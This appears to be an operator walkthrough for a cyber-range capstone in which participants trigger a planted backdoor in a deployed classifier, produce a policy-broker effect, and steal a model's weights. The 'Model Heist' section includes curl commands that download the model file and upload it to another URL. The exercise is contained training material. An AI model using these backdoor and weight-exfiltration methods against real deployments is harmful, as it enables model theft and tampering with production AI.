# Module 10 Deployed-AI Capstone Walkthrough

Operator walkthrough for Module 10 implementation. Run every participant command from the
external Kasm browser terminal as the synthetic participant. Cloud consoles,
SSH, Terraform, database consoles, proof internals, MLflow/MinIO consoles, and
operator-derived values may support diagnosis and reset, but do not satisfy a
step.

The bounded Kasm runner has established the `automated-proven` pre-playtest
one-pass bar recorded in
[`../module-10-proof-report.md`](../module-10-proof-report.md). This command
contract then passed in the generation-55 manual participant run, including the
full artifact transfer, and one focused generation-21 current-tree composition
repeated it after the scoped reset closure repair. On 2026-08-04, issue 62
repeated the base Module 10 path on retained range `kep-62-b1` through Kasm
and passed controls, deployment/trigger, impact, theft, and awards with all
seven receipts. It does not claim a statistical reliability result or golden.

## Start State

1. Use one reset generation spanning `dataset-store-01`,
   `distillation-runner-01`, `model-registry-01`, `artifact-store-01`,
   `exfil-sink`, `inference-gateway`, `guardrail-policy`, `model-host-01`,
   `telemetry-proof-01`, `idp-01`, and the participant/portal nodes.
2. Enter only through Kasm, obtain the participant token from the in-world
   synthetic credentials, and use `https://inference-gateway.keplerops.lab`.
3. Complete the current-generation prerequisites through their participant
   APIs: `kep-m05-e`, `kep-m06-e`, `kep-m08-e`, and a Module 09 candidate
   promoted and reloaded through at least `kep-m09-f` (the normal path also
   completes `kep-m09-g`). Keep the returned adversarial-artifact, extraction
   corpus/job, candidate, and deployment ids.
   In a retained range, confirm the `kep-m08-e` proof row is still fresh before
   requesting capstone receipts; the participant extraction replay can report a
   passed retained job while the distillation-runner-owned proof row has
   expired. Also refresh the participant Module 05 restart/deputy path before
   final awards so `ev-agent-persistence` from `kep-m05-d` and
   `ev-persistent-deputy` from `kep-m05-e` are both current.
4. List `/v1/capstone/challenges`; require `kep-m10-a` through `kep-m10-g` and
   confirm every receipt is initially unavailable.

Participants submit only prompts and server-issued coordinates. Identity,
generation, model lineage, inference, metrics, effects, artifact metadata,
copy verification, evidence, and verdicts remain server-owned.

## Production Revision — `kep-m10-a`

POST `/v1/capstone/attempt` with `challenge_id=kep-m10-a` and the reloaded
candidate id. Require the stored candidate, MLflow production alias,
deployment, resolved version, and artifact digest to agree, then issue
`flag-production-revision`.

A stale, cross-participant, registered-only, promoted-but-not-reloaded, or
caller-described deployment must fail.

## Live Trigger — `kep-m10-b`

1. POST `/v1/capstone/inference` with the candidate id and a trigger-bearing
   prompt discovered through the prior training/backdoor work.
2. Confirm the response identifies the bound deployment and model version and
   returns the real classifier decision and approved confidence.
3. Require `triggered=true`, then submit the candidate and returned activation
   id to the item attempt and issue `flag-production-trigger`.

The gateway downloads and reconstructs the exact promoted scikit-learn
artifact. A caller-supplied decision, confidence, digest, activation, or
unbound prompt does not satisfy the item.

## Contained Effect — `kep-m10-c`

POST `/v1/capstone/effects` with the trigger-positive activation id and the
current `kep-m06-e` adversarial-artifact id. The real OPA policy and existing
agent broker must execute and persist the release-channel notice. Submit the
candidate and same activation through the item attempt and issue
`flag-contained-effect`.

This state is deliberately reversible: the dataset-store reset removes the
effect and its joins. A file write, response-only claim, rejected broker call,
or artifact without a passed Module 06 attempt is insufficient.

## Original Artifact Access — `kep-m10-d`

POST `/v1/capstone/artifact-access` with the corpus and job ids from the passed
`kep-m08-e` private-fidelity proxy. Confirm the response describes the
revision-pinned `teacher-model`, its expected SHA-256 and 3,422,777,952-byte
size, a 15-minute source URL, and a participant-scoped contained destination
URL. Submit the access id to the item attempt and issue
`flag-original-artifact-access`.

The source is the real `model.safetensors` object uploaded by the model host at
bootstrap, not its YAML manifest. The URLs are capabilities for participant
execution; never copy them into telemetry, reports, or review comments.

## Deployed Impact — `kep-m10-e`

Submit the candidate and activation ids to `kep-m10-e`. Require one
current-generation causal join across:

- the exact promoted and reloaded model;
- its trigger-positive production activation;
- the executed capstone policy-broker effect;
- the participant's passed persistent Module 05 deputy effect; and
- the passed Module 06 adversarial artifact bound to the capstone effect.

Issue `flag-deployed-ai-impact`. A loose collection of prior flags, mixed
participants, mixed generations, or unexecuted records must not pass.

## Model Heist — `kep-m10-f`

Perform the transfer from the Kasm terminal before the access URLs expire. A
straightforward participant path is:

```bash
curl --fail --location "$SOURCE_URL" --output /tmp/model.safetensors
test "$(stat -c %s /tmp/model.safetensors)" -eq 3422777952
curl --fail --request PUT --upload-file /tmp/model.safetensors "$DESTINATION_URL"
```

POST `/v1/capstone/artifact-access/$ACCESS_ID/verify`. The gateway must read
the contained destination object, recompute SHA-256 over every byte, and match
both source digest and byte count. Only then submit `kep-m10-f` with the access
id and issue `flag-model-exfiltration`.

Do not substitute public egress, a manifest, a partial object, copied metadata,
or caller-supplied hash. Delete the temporary participant copy after the pass;
the range reset owns the authoritative cleanup.

## Kepler Falling — `kep-m10-g`

Submit candidate, activation, and access ids to the final attempt. Require the
same-generation deployed-impact and byte-complete-theft predicates to pass.
Then request `flag-ai-capstone`; the proof service derives its receipt only
after all SDL-declared capstone evidence, including the prior module evidence,
is present for this participant and generation.

## Representative Negatives

From Kasm, confirm:

1. Extra identity, generation, metric, digest, verdict, byte-count, destination,
   or evidence fields return 422.
2. A non-reloaded candidate or activation from a different participant or
   generation cannot infer, effect, attempt, or award.
3. A blocked/low-confidence inference cannot execute the effect.
4. An adversarial artifact without a passed `kep-m06-e` attempt and extraction
   lineage without a passed `kep-m08-e` attempt both fail.
5. A missing, truncated, modified, manifest-only, or wrong-destination object
   cannot verify or award.
6. Presigned URLs are fixed to the two internal MinIO endpoints and cannot
   name a public destination.
7. Item receipts remain unavailable before their exact evidence and cannot be
   substituted across participants, items, objects, or generations.

## Reset And Health

Run one scoped module reset. Verify the new generation contains no capstone
activations, effects, artifact-access records, attempts, exfil objects, proof
rows, or receipts. Confirm the original artifact store object is restored with
its pinned size/digest, the exfil bucket is empty, the production start state
is healthy, and no raw prompt, model bytes, presigned URL, credential, or flag
appears in research telemetry. Rerun every affected participant step after any
defect fix before changing the implementation status. Generation 55 satisfied
the participant-command condition; the canonical reset into generation 65 and
Phase-E teardown now pass. The declared reliability campaign remains separate
hardening work.
